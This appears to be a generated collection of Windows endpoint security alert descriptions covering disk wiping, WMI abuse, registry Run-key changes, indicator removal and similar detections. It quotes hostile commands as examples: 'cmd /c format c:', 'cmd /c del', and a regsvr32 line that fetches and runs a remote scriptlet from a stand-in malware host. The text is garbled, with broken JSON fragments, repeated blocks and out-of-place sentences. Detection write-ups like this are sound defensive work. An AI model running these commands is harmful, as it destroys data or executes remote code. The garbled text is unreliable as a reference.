{\"Event\": {\"@xmlns\": \"http://schema: Alert Name: ClipboardChange (New content in the clipboard). - Key Characteristics: ClipboardChange, system clipboard contents change. - Cybersecurity Alert Description: This alert is generated by Microsoft Windows Sysmon when there is a change in the system clipboard contents. The alert provides information about the process ID, image, and user associated with the change. This can be useful for detecting suspicious activity related to data exfiltration or other malicious activities involving the clipboard.

Alert Name: Unusual Parent Process. High. Command and Scripting Interpreter (T1059.003). - Key Characteristics: Suspicious parent-child process relationship with cmd.exe descending from an unusual process. - Cybersecurity Alert Description: The alert indicates the detection of a suspicious parent-child process relationship with cmd.exe descending from an unusual process. The alert is classified as high severity and falls under the Command and Scripting Interpreter (T1059.003) category. Alert Name: Command Interpreter Launched by Unusual Parent Process. - Key Characteristics: Custom command interpreter, malicious activity indicator, T1059.003. - Cybersecurity Alert Description: The system command interpreter (cmd.exe) was launched by a non-standard parent process, which could indicate the use of a custom command interpreter and potentially malicious activity. This alert falls under the T1059.003 category of Command and Scripting Interpreter and can be detected through EDR.

Alert Name: Potential Disk Wiping Activity Detected. - Key Characteristics: High, Disk Wipe, Behavior, EDR. - Cybersecurity Alert Description: This alert indicates potential disk wiping activity detected on a system or network, which can lead to the interruption of availability to system and network resources. The alert provides an example of the behavior observed on a Windows device with the timestamp and relevant processes involved. It is important to investigate and take necessary actions to prevent such activities. Alert Name: Disk Wiping Detection. - Key Characteristics: Potential disk wiping activity detected on Windows device through cmd.exe and explorer.exe. - Cybersecurity Alert Description: This alert indicates potential disk wiping activity on a Windows device initiated through cmd.exe with the command "cmd /c format c:" and also through explorer.exe. This alert should be investigated immediately to prevent data loss or destruction.

Alert Name: Modify System Image. - Key Characteristics: Adversaries may modify the operating system of embedded network devices to weaken defenses and gain new capabilities. Defense Evasion. Critical. Endpoint. - Cybersecurity Alert Description: The alert warns of potential unauthorized modifications to critical system files on the endpoint server, which can weaken defenses and provide adversaries with new capabilities. Monitoring for any unauthorized modifications to system images is critical to prevent potential security breaches. Alert Name: File Write Attempt to Modify System Disk Image or Firmware. - Key Characteristics: Detect, Critical, Unauthorized Modification, System File. - Cybersecurity Alert Description: The alert indicates an attempt to modify the system's disk image or firmware, which is unauthorized and poses a critical threat to the system's security. Detection of this activity is crucial to prevent any further damage.

Alert Name: Indirect Command Execution. - Key Characteristics: Adversaries exploit utilities to bypass security restrictions. Endpoint server01 affected. Command executed: regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll. Unauthorized command execution blocked. - Cybersecurity Alert Description: This alert reports an incident of Indirect Command Execution where adversaries abused utilities to execute a command and bypass security restrictions. The endpoint server01 was affected, and the command executed was regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll using regsvr32.exe. The alert indicates that unauthorized command execution was blocked.

Alert Name: Potential Disk Wiping Activity Detected. - Key Characteristics: High, Disk Wipe, Behavior, EDR. - Cybersecurity Alert Description: This alert indicates potential disk wiping activity detected on a system or network, which can lead to the interruption of availability to system and network resources. The alert provides an example of the behavior observed on a Windows device with the timestamp and relevant processes involved. It is important to investigate and take necessary actions to prevent such activities. Alert Name: Disk Wiping Detection. - Key Characteristics: Potential disk wiping activity detected on Windows device through cmd.exe and explorer.exe. - Cybersecurity Alert Description: This alert indicates potential disk wiping activity on a Windows device initiated through cmd.exe with the command "cmd /c format c:" and also through explorer.exe. This alert should be investigated immediately to prevent data loss or destruction.

Alert Name: Indicator Removal. - Key Characteristics: Defense Evasion, Endpoint, File Deletion. - Cybersecurity Alert Description: Adversaries may delete or modify artifacts within systems to remove evidence of their presence or hinder defenses. This high severity threat uses defense evasion techniques and affects the endpoint desktop01. Unauthorized file deletion of malware.exe located in C:\ProgramData is blocked. Alert Name: File Deletion Attempt to Avoid Detection. - Key Characteristics: High Severity, Indicators of Compromise Removal, Unauthorized File Deletion. - Cybersecurity Alert Description: This high severity alert warns of an attempt to remove indicators of compromise to avoid detection. An unauthorized file deletion was detected, indicating a potential compromise that requires further investigation and appropriate action.

{\"event\": {\"@xmlns\": \"http://schema: Alert Name: Data Destruction Threat. - Key Characteristics: Endpoint activity detected, new behavior, high impact, cmd /c del command used. - Cybersecurity Alert Description: This alert indicates that data destruction activity was detected on an endpoint using the "cmd /c del" command. The behavior is new and has a high impact, making it important to investigate the source and extent of the activity.

{\"Event\": {\"@xmlns\": \"http://schema: Alert Name: Implant Internal Image. - Key Characteristics: High, detected on PC-1234, internal_image.dll, explorer.exe. - Cybersecurity Alert Description: A high-level alert has been triggered due to the detection of an implant internal image on a device. The file associated with the alert is internal_image.dll and it is involved with the process explorer.exe. It is recommended to investigate and take necessary actions to mitigate the threat. Alert Name: Implanted Container Image. - Key Characteristics: Internal container image detected on host SERVER-789. - Cybersecurity Alert Description: This alert indicates that an implanted internal container image has been detected on a host. This could potentially be a sign of a malicious actor attempting to gain unauthorized access to the system.

Alert Name: Suspicious Web Service Connection. - Key Characteristics: Suspicious network activity, web service, endpoint, svchost.exe, DcomLaunch, W3SVC, inetsrv, w3wp.exe. - Cybersecurity Alert Description: Suspicious network activity related to a web service on the endpoint has been detected. The process involved is svchost.exe with the argument -k DcomLaunch and the use of W3SVC and inetsrv\w3wp.exe. Further investigation is recommended to determine if this is a potential threat.

Alert Name: Windows Management Instrumentation Execution. - Key Characteristics: High, WMI, bypass traditional security controls. - Cybersecurity Alert Description: Attackers use WMI to execute commands or scripts on a system, bypassing traditional security controls. The endpoint affected is Defender and the executable file associated with this alert is wmiprvse.exe. Alert Name: Windows Management Instrumentation Threat. - Key Characteristics: Detects use of WMI for lateral movement or other malicious activities, process wmiprvse.exe and svchost.exe. - Cybersecurity Alert Description: This high-level threat alert detects the use of WMI for lateral movement or other malicious activities. The alert monitors the processes wmiprvse.exe and svchost.exe, which are commonly used by attackers to execute malicious code.

Alert Name: Windows Management Instrumentation Execution. - Key Characteristics: High, WMI, bypass traditional security controls. - Cybersecurity Alert Description: Attackers use WMI to execute commands or scripts on a system, bypassing traditional security controls. Alert Name: Inter-Process Communication Abuse. - Key Characteristics: IPC, local code execution, command execution, defense evasion, suspicious communication. - Cybersecurity Alert Description: Adversaries may exploit IPC mechanisms to execute local code or commands. A suspicious communication was detected between trusted processes, indicating possible defense evasion and command and control activity. Further investigation is recommended.

Alert Name: A process changed a file creation time. - Key Characteristics: File creation time explicitly modified by a process, helps track real creation time of a file, attackers may change file creation time of a backdoor. - Cybersecurity Alert Description: This alert is triggered when a process modifies the creation time of a file. The purpose of this event is to track the actual creation time of a file. Attackers may change the file creation time of a backdoor to make it appear as if it was installed with the operating system.

Alert Name: Modify Registry. Key Characteristics: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution. Defense Evasion. High severity. Cybersecurity Alert Description: The Modify Registry alert indicates that adversaries may attempt to modify the Windows Registry to conceal configuration information, remove data, or facilitate persistence and execution. This technique is often used for defense evasion purposes and poses a high threat level. The alert was triggered on endpoint desktop01 when an unauthorized modification of the HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry key was detected and blocked.

This falls under the category of Process/Service Stop and is classified as High severity.

Alert Name: ServiceConfigurationChange. - Key Characteristics: Logs changes in Sysmon configuration, tracks updates in filtering rules. - Cybersecurity Alert Description: This alert logs changes in the Sysmon configuration, specifically when filtering rules are updated. This can be useful in detecting unauthorized changes to the system configuration.

The alert was triggered on endpoint desktop01 when an unauthorized modification of the HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry key was detected and blocked.

Alert Name: Service Stop. - Key Characteristics: Defender for Endpoint, Windows service, EDR, SuspiciousServiceName. - Cybersecurity Alert Description: A suspicious stop of a Windows service named SuspiciousServiceName has been detected by Defender for Endpoint using EDR technology. This falls under the category of Process/Service Stop and is classified as High severity.

Alert Name: ServiceConfigurationChange. - Key Characteristics: Logs changes in Sysmon configuration, updates filtering rules. - Cybersecurity Alert Description: This alert logs changes in the Sysmon configuration, specifically when filtering rules are updated. It provides information on the process ID, image path, service name, and description of the service that was changed. This can be useful in detecting unauthorized changes to the system configuration.

Alert Name: Windows Management Instrumentation Execution. - Key Characteristics: High, WMI, bypass traditional security controls. - Cybersecurity Alert Description: Attackers use WMI to execute commands or scripts on a system, bypassing traditional security controls. The endpoint affected is Defender and the executable file associated with this alert is wmiprvse.exe. Alert Name: Windows Management Instrumentation Threat. - Key Characteristics: Detects use of WMI for lateral movement or other malicious activities, process wmiprvse.exe and svchost.exe. - Cybersecurity Alert Description: This high-level threat alert detects the use of WMI for lateral movement or other malicious activities. The alert monitors the processes wmiprvse.exe and svchost.exe, which are commonly used by attackers to execute malicious code.

{\"Event\": {\"@xmlns\": \"http://schema: Alert Name: ClipboardChange (New content in the clipboard). - Key Characteristics: ClipboardChange, system clipboard contents change. - Cybersecurity Alert Description: This alert is generated by Microsoft Windows Sysmon when there is a change in the system clipboard contents. The alert provides information about the process ID, image, and user associated with the change. This can be useful for detecting suspicious activity related to data exfiltration or other malicious activities involving the clipboard.

Alert Name: Unusual Parent Process. High. Command and Scripting Interpreter (T1059.003). - Key Characteristics: Suspicious parent-child process relationship with cmd.exe descending from an unusual process. - Cybersecurity Alert Description: The alert indicates the detection of a suspicious parent-child process relationship with cmd.exe descending from an unusual process. The alert is classified as high severity and falls under the Command and Scripting Interpreter (T1059.003) category. Alert Name: Command Interpreter Launched by Unusual Parent Process. - Key Characteristics: Custom command interpreter, malicious activity indicator, T1059.003. - Cybersecurity Alert Description: The system command interpreter (cmd.exe) was launched by a non-standard parent process, which could indicate the use of a custom command interpreter and potentially malicious activity. This alert falls under the T1059.003 category of Command and Scripting Interpreter and can be detected through EDR.

Alert Name: Potential Disk Wiping Activity Detected. - Key Characteristics: High, Disk Wipe, Behavior, EDR. - Cybersecurity Alert Description: This alert indicates potential disk wiping activity detected on a system or network, which can lead to the interruption of availability to system and network resources. The alert provides an example of the behavior observed on a Windows device with the timestamp and relevant processes involved. It is important to investigate and take necessary actions to prevent such activities. Alert Name: Disk Wiping Detection. - Key Characteristics: Potential disk wiping activity detected on Windows device through cmd.exe and explorer.exe. - Cybersecurity Alert Description: This alert indicates potential disk wiping activity on a Windows device initiated through cmd.exe with the command "cmd /c format c:" and also through explorer.exe. This alert should be investigated immediately to prevent data loss or destruction.

Alert Name: Modify System Image. - Key Characteristics: Adversaries may modify the operating system of embedded network devices to weaken defenses and gain new capabilities. Defense Evasion. Critical. Endpoint. - Cybersecurity Alert Description: The alert warns of potential unauthorized modifications to critical system files on the endpoint server, which can weaken defenses and provide adversaries with new capabilities. Monitoring for any unauthorized modifications to system images is critical to prevent potential security breaches. Alert Name: File Write Attempt to Modify System Disk Image or Firmware. - Key Characteristics: Detect, Critical, Unauthorized Modification, System File. - Cybersecurity Alert Description: The alert indicates an attempt to modify the system's disk image or firmware, which is unauthorized and poses a critical threat to the system's security. Detection of this activity is crucial to prevent any further damage.

Alert Name: Indirect Command Execution. - Key Characteristics: Adversaries exploit utilities to bypass security restrictions. Endpoint server01 affected. Command executed: regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll. Unauthorized command execution blocked. - Cybersecurity Alert Description: This alert reports an incident of Indirect Command Execution where adversaries abused utilities to execute a command and bypass security restrictions. The endpoint server01 was affected, and the command executed was regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll using regsvr32.exe. The alert indicates that unauthorized command execution was blocked.

Alert Name: Indicator Removal. - Key Characteristics: Defense Evasion, Endpoint, File Deletion. - Cybersecurity Alert Description: Adversaries may delete or modify artifacts within systems to remove evidence of their presence or hinder defenses. This high severity threat uses defense evasion techniques and affects the endpoint desktop01. Unauthorized file deletion of malware.exe located in C:\ProgramData is blocked. Alert Name: File Deletion Attempt to Avoid Detection. - Key Characteristics: High Severity, Indicators of Compromise Removal, Unauthorized File Deletion. - Cybersecurity Alert Description: This high severity alert warns of an attempt to remove indicators of compromise to avoid detection. An unauthorized file deletion was detected, indicating a potential compromise that requires further investigation and appropriate action.

Alert Name: Implanted Container Image. - Key Characteristics: Internal container image detected on host SERVER-789. - Cybersecurity Alert Description: This alert indicates that an implanted internal container image has been detected on a host. This could potentially be a sign of a malicious actor attempting to gain unauthorized access to the system.

Alert Name: Suspicious Web Service Connection. - Key Characteristics: Suspicious network activity, web service, endpoint, svchost.exe, DcomLaunch, W3SVC, inetsrv, w3wp.exe. - Cybersecurity Alert Description: Suspicious network activity related to a web service on the endpoint has been detected. The process involved is svchost.exe with the argument -k DcomLaunch and the use of W3SVC and inetsrv\w3wp.exe. Further investigation is recommended to determine if this is a potential threat.

Alert Name: Inter-Process Communication Abuse. - Key Characteristics: IPC, local code execution, command execution, defense evasion, suspicious communication. - Cybersecurity Alert Description: Adversaries may exploit IPC mechanisms to execute local code or commands. A suspicious communication was detected between trusted processes, indicating possible defense evasion and command and control activity. Further investigation is recommended.

Alert Name: A process changed a file creation time. - Key Characteristics: File creation time explicitly modified by a process, helps track real creation time of a file, attackers may change file creation time of a backdoor. - Cybersecurity Alert Description: This alert is triggered when a process modifies the creation time of a file. The purpose of this event is to track the actual creation time of a file. Attackers may change the file creation time of a backdoor to make it appear as if it was installed with the operating system.
